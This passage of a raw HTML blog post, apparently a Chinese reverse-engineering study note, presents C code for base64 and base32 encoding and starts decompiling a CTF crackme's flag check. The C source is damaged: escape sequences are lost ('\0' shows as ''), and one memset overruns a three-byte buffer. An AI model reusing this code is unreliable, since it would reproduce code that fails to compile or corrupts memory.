class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;string.h&quot;</span>   </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;stdlib.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> base[] = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=&quot;</span>; </span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">char</span> <span class="title">find_pos</span><span class="params">(<span class="keyword">char</span> ch)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">base64_encode</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* data, <span class="keyword">int</span> data_len,<span class="keyword">int</span> *len)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">base64_decode</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* data, <span class="keyword">int</span> data_len,<span class="keyword">int</span> *len)</span></span>;   </span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *找到ch在base中的位置 </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">char</span> <span class="title">find_pos</span><span class="params">(<span class="keyword">char</span> ch)</span>    </span></span><br><span class="line"><span class="function"></span>&#123;   </span><br><span class="line">    <span class="comment">//the last position (the only) in base[] </span></span><br><span class="line">    <span class="keyword">char</span> *ptr = (<span class="keyword">char</span>*)<span class="built_in">strrchr</span>(base, ch);  </span><br><span class="line">    <span class="keyword">return</span> (ptr - base);   </span><br><span class="line">&#125;    </span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *BASE64编码 </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">base64_encode</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* data, <span class="keyword">int</span> data_len,<span class="keyword">int</span> *len)</span>   </span></span><br><span class="line"><span class="function"></span>&#123;      </span><br><span class="line">    <span class="keyword">int</span> prepare = <span class="number">0</span>;   </span><br><span class="line">    <span class="keyword">int</span> ret_len;   </span><br><span class="line">    *len=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> temp = <span class="number">0</span>;   </span><br><span class="line">    <span class="keyword">char</span> *ret = <span class="literal">NULL</span>;   </span><br><span class="line">    <span class="keyword">char</span> *f = <span class="literal">NULL</span>;   </span><br><span class="line">    <span class="keyword">int</span> tmp = <span class="number">0</span>;   </span><br><span class="line">    <span class="keyword">char</span> changed[<span class="number">4</span>];   </span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>;   </span><br><span class="line">    ret_len = data_len / <span class="number">3</span>;   </span><br><span class="line">    temp = data_len % <span class="number">3</span>;   </span><br><span class="line">    <span class="keyword">if</span> (temp &gt; <span class="number">0</span>)   </span><br><span class="line">    &#123;   </span><br><span class="line">        ret_len += <span class="number">1</span>;   </span><br><span class="line">    &#125;   </span><br><span class="line">    <span class="comment">//最后一位以&#x27;&#x27;结束  </span></span><br><span class="line">    ret_len = ret_len*<span class="number">4</span> + <span class="number">1</span>;   </span><br><span class="line">    ret = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(ret_len);   </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( ret == <span class="literal">NULL</span>)   </span><br><span class="line">    &#123;   </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;No enough memory.n&quot;</span>);   </span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);   </span><br><span class="line">    &#125;   </span><br><span class="line">    <span class="built_in">memset</span>(ret, <span class="number">0</span>, ret_len);   </span><br><span class="line">    f = ret; </span><br><span class="line">    <span class="comment">//tmp记录data中移动位置   </span></span><br><span class="line">    <span class="keyword">while</span> (tmp &lt; data_len)   </span><br><span class="line">    &#123;   </span><br><span class="line">        temp = <span class="number">0</span>;   </span><br><span class="line">        prepare = <span class="number">0</span>;   </span><br><span class="line">        <span class="built_in">memset</span>(changed, <span class="number">0</span>, <span class="number">4</span>);   </span><br><span class="line">        <span class="keyword">while</span> (temp &lt; <span class="number">3</span>)   </span><br><span class="line">        &#123;      </span><br><span class="line">            <span class="keyword">if</span> (tmp &gt;= data_len)   </span><br><span class="line">            &#123;   </span><br><span class="line">                <span class="keyword">break</span>;   </span><br><span class="line">            &#125;  </span><br><span class="line">            <span class="comment">//将data前8*3位移入prepare的低24位  </span></span><br><span class="line">            prepare = ((prepare &lt;&lt; <span class="number">8</span>) | (data[tmp] &amp; <span class="number">0xFF</span>));   </span><br><span class="line">            tmp++;   </span><br><span class="line">            temp++;   </span><br><span class="line">        &#125;   </span><br><span class="line">        <span class="comment">//将有效数据移到以prepare的第24位起始位置 </span></span><br><span class="line">        prepare = (prepare&lt;&lt;((<span class="number">3</span>-temp)*<span class="number">8</span>));   </span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">4</span> ;i++ )   </span><br><span class="line">        &#123;   </span><br><span class="line">            <span class="comment">//最后一位或两位 </span></span><br><span class="line">            <span class="keyword">if</span> (temp &lt; i)   </span><br><span class="line">            &#123;   </span><br><span class="line">                changed[i] = <span class="number">0x40</span>;   </span><br><span class="line">            &#125;   </span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;   </span><br><span class="line">                <span class="comment">//24位数据 </span></span><br><span class="line">                changed[i] = (prepare&gt;&gt;((<span class="number">3</span>-i)*<span class="number">6</span>)) &amp; <span class="number">0x3F</span>;   </span><br><span class="line">            &#125;   </span><br><span class="line">            *f = base[changed[i]];   </span><br><span class="line"></span><br><span class="line">            f++; </span><br><span class="line">            (*len)++;  </span><br><span class="line">        &#125;   </span><br><span class="line">    &#125;   </span><br><span class="line">    *f = <span class="string">&#x27;&#x27;;   </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    return ret;   </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/**</span></span><br><span class="line"><span class="string"> *BASE64解码 </span></span><br><span class="line"><span class="string"> */</span></span><br><span class="line"><span class="string">char *base64_decode(const char *data, int data_len,int *len)   </span></span><br><span class="line"><span class="string">&#123;   </span></span><br><span class="line"><span class="string">    int ret_len = (data_len / 4) * 3+1;   </span></span><br><span class="line"><span class="string">    int equal_count = 0;   </span></span><br><span class="line"><span class="string">    char *ret = NULL;   </span></span><br><span class="line"><span class="string">    char *f = NULL;   </span></span><br><span class="line"><span class="string">    *len=0;</span></span><br><span class="line"><span class="string">    int tmp = 0;   </span></span><br><span class="line"><span class="string">    int temp = 0;   </span></span><br><span class="line"><span class="string">    char need[3];   </span></span><br><span class="line"><span class="string">    int prepare = 0;   </span></span><br><span class="line"><span class="string">    int i = 0;   </span></span><br><span class="line"><span class="string">    if (*(data + data_len - 1) == &#x27;</span>=<span class="string">&#x27;)   </span></span><br><span class="line"><span class="string">    &#123;   </span></span><br><span class="line"><span class="string">        equal_count += 1;   </span></span><br><span class="line"><span class="string">    &#125;   </span></span><br><span class="line"><span class="string">    if (*(data + data_len - 2) == &#x27;</span>=<span class="string">&#x27;)   </span></span><br><span class="line"><span class="string">    &#123;   </span></span><br><span class="line"><span class="string">        equal_count += 1;   </span></span><br><span class="line"><span class="string">    &#125;   </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    ret = (char *)malloc(ret_len);   </span></span><br><span class="line"><span class="string">    if (ret == NULL)   </span></span><br><span class="line"><span class="string">    &#123;   </span></span><br><span class="line"><span class="string">        printf(&quot;No enough memory.n&quot;);   </span></span><br><span class="line"><span class="string">        exit(0);   </span></span><br><span class="line"><span class="string">    &#125;   </span></span><br><span class="line"><span class="string">    memset(ret, 0, ret_len);   </span></span><br><span class="line"><span class="string">    f = ret;   </span></span><br><span class="line"><span class="string">    while (tmp &lt; (data_len - equal_count))   </span></span><br><span class="line"><span class="string">    &#123;   </span></span><br><span class="line"><span class="string">        temp = 0;   </span></span><br><span class="line"><span class="string">        prepare = 0;   </span></span><br><span class="line"><span class="string">        memset(need, 0, 4);   </span></span><br><span class="line"><span class="string">        while (temp &lt; 4)   </span></span><br><span class="line"><span class="string">        &#123;   </span></span><br><span class="line"><span class="string">            if (tmp &gt;= (data_len - equal_count))   </span></span><br><span class="line"><span class="string">            &#123;   </span></span><br><span class="line"><span class="string">                break;   </span></span><br><span class="line"><span class="string">            &#125;   </span></span><br><span class="line"><span class="string">            prepare = (prepare &lt;&lt; 6) | (find_pos(data[tmp]));   </span></span><br><span class="line"><span class="string">            temp++;   </span></span><br><span class="line"><span class="string">            tmp++;   </span></span><br><span class="line"><span class="string">        &#125;   </span></span><br><span class="line"><span class="string">        prepare = prepare &lt;&lt; ((4-temp) * 6);   </span></span><br><span class="line"><span class="string">        for (i=0; i&lt;3 ;i++ )   </span></span><br><span class="line"><span class="string">        &#123;   </span></span><br><span class="line"><span class="string">            if (i == temp)   </span></span><br><span class="line"><span class="string">            &#123;   </span></span><br><span class="line"><span class="string">                break;   </span></span><br><span class="line"><span class="string">            &#125;   </span></span><br><span class="line"><span class="string">            *f = (char)((prepare&gt;&gt;((2-i)*8)) &amp; 0xFF);   </span></span><br><span class="line"><span class="string">            f++;</span></span><br><span class="line"><span class="string">            (*len)++;   </span></span><br><span class="line"><span class="string">        &#125;   </span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    *f = &#x27;</span><span class="string">&#x27;; </span></span><br><span class="line"><span class="string">    if(data[data_len-1]==&#x27;</span>=<span class="string">&#x27;)</span></span><br><span class="line"><span class="string">    &#123;</span></span><br><span class="line"><span class="string">        (*len)--;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    /*</span></span><br><span class="line"><span class="string">    while(*(--f)==&#x27;</span><span class="string">&#x27;)</span></span><br><span class="line"><span class="string">    &#123;</span></span><br><span class="line"><span class="string">      (*len)--;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &#125; </span></span><br><span class="line"><span class="string">    */</span></span><br><span class="line"><span class="string">    return ret;   </span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">int main()&#123;</span></span><br><span class="line"><span class="string">    char *former = &quot;hello&quot;;</span></span><br><span class="line"><span class="string">    int len1,len2;</span></span><br><span class="line"><span class="string">    printf(&quot;%sn&quot;,former);</span></span><br><span class="line"><span class="string">    char *after = base64_encode(former, 5,&amp;len1);</span></span><br><span class="line"><span class="string">    printf(&quot;%d %sn&quot;,len1,after);</span></span><br><span class="line"><span class="string">    former = base64_decode(after, len1,&amp;len2);</span></span><br><span class="line"><span class="string">    printf(&quot;%d %sn&quot;,len2,former);</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure><h3 id="base32"><a href="#base32" class="headerlink" title="base32"></a>base32</h3><p>Base32这种数据编码机制，主要用来把二进制数据编码成可见的字符串，其编码规则是：任意给定一个二进制数据，以5个位(bit)为一组进行切分(base64以6个位(bit)为一组)，对切分而成的每个组进行编码得到1个可见字符。Base32编码表字符集中的字符总数为25=32个，这也是Base32名字的由来。下面是Base32的table</p><p><img src="https://raw.githubusercontent.com/Phantomor/images/main/img/Crypto/base/b3.jpg" alt="base32"></p><p>C语言实现</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//base32 表包含 0~9 以及小写字母 (去除&#x27;a&#x27;,&#x27;i&#x27;,&#x27;l&#x27;,&#x27;o&#x27;)，</span></span><br><span class="line"><span class="comment">//共 32 个字符</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">char</span> base32_alphabet[<span class="number">32</span>] = &#123;</span><br><span class="line">        <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;7&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;8&#x27;</span>, <span class="string">&#x27;9&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;g&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;j&#x27;</span>, <span class="string">&#x27;k&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;q&#x27;</span>, <span class="string">&#x27;r&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;v&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, <span class="string">&#x27;x&#x27;</span>, <span class="string">&#x27;y&#x27;</span>, <span class="string">&#x27;z&#x27;</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 匹配 base32_alphabet</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">find_number</span><span class="params">(<span class="keyword">char</span> m)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">32</span>; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(m == base32_alphabet[i])</span><br><span class="line">            <span class="keyword">return</span> i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * base32 编码</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">char</span>* <span class="title">base32_encode</span><span class="params">(<span class="keyword">char</span> *bin_source)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">int</span> j = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">char</span> str[<span class="number">10</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="built_in">strlen</span>(bin_source);++i)&#123;</span><br><span class="line">        <span class="keyword">if</span>((i+<span class="number">1</span>)%<span class="number">5</span>==<span class="number">0</span>)&#123;</span><br><span class="line">            j++;</span><br><span class="line">            <span class="keyword">int</span> num = (bin_source[i]-<span class="string">&#x27;0&#x27;</span>)+(bin_source[i<span class="number">-1</span>]-<span class="string">&#x27;0&#x27;</span>)*<span class="number">2</span>\</span><br><span class="line">            +(bin_source[i<span class="number">-2</span>]-<span class="string">&#x27;0&#x27;</span>)*<span class="number">2</span>*<span class="number">2</span>+(bin_source[i<span class="number">-3</span>]-<span class="string">&#x27;0&#x27;</span>)*<span class="number">2</span>*<span class="number">2</span>*<span class="number">2</span>\</span><br><span class="line">            +(bin_source[i<span class="number">-4</span>]-<span class="string">&#x27;0&#x27;</span>)*<span class="number">2</span>*<span class="number">2</span>*<span class="number">2</span>*<span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">            str[j<span class="number">-1</span>] = base32_alphabet[num];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> str;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * base32 解码</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span>* <span class="title">base32_decode</span><span class="params">(<span class="keyword">char</span> *str_source)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i,j;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">int</span> dec[<span class="number">50</span>];</span><br><span class="line">    <span class="keyword">int</span> count=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="built_in">strlen</span>(str_source);++i)&#123;</span><br><span class="line">        <span class="keyword">for</span>(j=<span class="number">5</span><span class="number">-1</span>;j&gt;=<span class="number">0</span>;--j)&#123;</span><br><span class="line">            count++;</span><br><span class="line">            <span class="comment">//位运算十进制转二进制</span></span><br><span class="line">            dec[count<span class="number">-1</span>] = find_number(str_source[i])&gt;&gt;(j%<span class="number">5</span>)&amp;<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dec;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="base16"><a href="#base16" class="headerlink" title="base16"></a>base16</h3><p>先拖着，没见过base16的逆向</p><h2 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h2><p><strong>运算规则</strong></p><blockquote><p>base64编码是用64（2的6次方）个ASCII字符来表示256（2的8次方）个ASCII字符，也就是三位二进制数组经过编码后变为四位的ASCII字符显示，长度比原来增加1/3。</p></blockquote><blockquote><p>同样，base32就是用32（2的5次方）个特定ASCII码来表示256个ASCII码。所以，5个ASCII字符经过base32编码后会变为8个字符（公约数为40），长度增加3/5.不足8n用“=”补足。</p></blockquote><blockquote><p>base16就是用16（2的4次方）个特定ASCII码表示256个ASCII字符。1个ASCII字符经过base16编码后会变为2个字符，长度增加一倍。不足2n用“=”补足</p></blockquote><p>来几道题</p><h3 id="2018巅峰极客网络安全技能挑战赛-RE-1-Simple-Base-N"><a href="#2018巅峰极客网络安全技能挑战赛-RE-1-Simple-Base-N" class="headerlink" title="2018巅峰极客网络安全技能挑战赛 RE(1) Simple Base-N"></a>2018巅峰极客网络安全技能挑战赛 RE(1) Simple Base-N</h3><p>找不到原文件就不写了</p><p><a href="https://kabeor.cn/2018%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E6%8C%91%E6%88%98%E8%B5%9B%20RE(1)%20Simple%20Base-N/">大佬的WP</a></p><h3 id="2017第二届广东省强网杯线上赛–Nonstandard-base32换表"><a href="#2017第二届广东省强网杯线上赛–Nonstandard-base32换表" class="headerlink" title="2017第二届广东省强网杯线上赛–Nonstandard (base32换表)"></a>2017第二届广东省强网杯线上赛–Nonstandard (base32换表)</h3><p><a href="http://static2.ichunqiu.com/icq/resources/fileupload/CTF/echunqiu/qwb/Nonstandard_26195e1832795caa18fd4c7cfbd56600.zip">文件</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//主函数</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  FILE *v3; <span class="comment">// eax</span></span><br><span class="line">  FILE *v4; <span class="comment">// eax</span></span><br><span class="line">  FILE *v5; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> Buffer[<span class="number">16</span>]; <span class="comment">// [esp+0h] [ebp-24h] BYREF</span></span><br><span class="line">  __int64 v8; <span class="comment">// [esp+10h] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// [esp+18h] [ebp-Ch]</span></span><br><span class="line">  __int16 v10; <span class="comment">// [esp+1Ch] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  v9 = <span class="number">0</span>;</span><br><span class="line">  *(_OWORD *)Buffer = <span class="number">0</span>i64;</span><br><span class="line">  v10 = <span class="number">0</span>;</span><br><span class="line">  v8 = <span class="number">0</span>i64;</span><br><span class="line">  v3 = _iob_func();</span><br><span class="line">  <span class="built_in">fputs</span>(<span class="string">&quot;Place Input Flag:\n&quot;</span>, v3 + <span class="number">1</span>);</span><br><span class="line">  v4 = _iob_func();</span><br><span class="line">  fgets(Buffer, <span class="number">29</span>, v4);</span><br><span class="line">  <span class="keyword">if</span> ( sub_401480(Buffer) == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v5 = _iob_func();</span><br><span class="line">    <span class="built_in">fputs</span>(<span class="string">&quot;yes\n&quot;</span>, v5 + <span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>接着看sub_401480函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __thiscall <span class="title">sub_401480</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *<span class="keyword">this</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v2; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v4; <span class="comment">// kr04_4</span></span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> Destination; <span class="comment">// [esp+4h] [ebp-38h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v7[<span class="number">49</span>]; <span class="comment">// [esp+5h] [ebp-37h] BYREF</span></span><br><span class="line"></span><br><span class="line">  Destination = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(v7, <span class="number">0</span>, <span class="keyword">sizeof</span>(v7));</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(<span class="keyword">this</span>) != <span class="number">28</span> )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_7;</span><br><span class="line">  v2 = (<span class="keyword">const</span> <span class="keyword">char</span> *)sub_401070(<span class="keyword">this</span>);</span><br><span class="line">  strncpy_s(&amp;Destination, <span class="number">0x32</span>u, v2, <span class="number">0x30</span>u);</span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  v4 = <span class="built_in">strlen</span>(&amp;Destination);</span><br><span class="line">  <span class="keyword">if</span> ( !v4 )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_7;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( aNadtxa66nbbdxa[v3] != *(&amp;Destination + v3) )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    ++v3;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v3 &lt; v4 );</span><br><span class="line">  <span class="keyword">if</span> ( v3 == <span class="number">48</span> )</span><br><span class="line">    result = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">LABEL_7:</span><br><span class="line">    result = <span class="number">-1</span>;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>70函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span 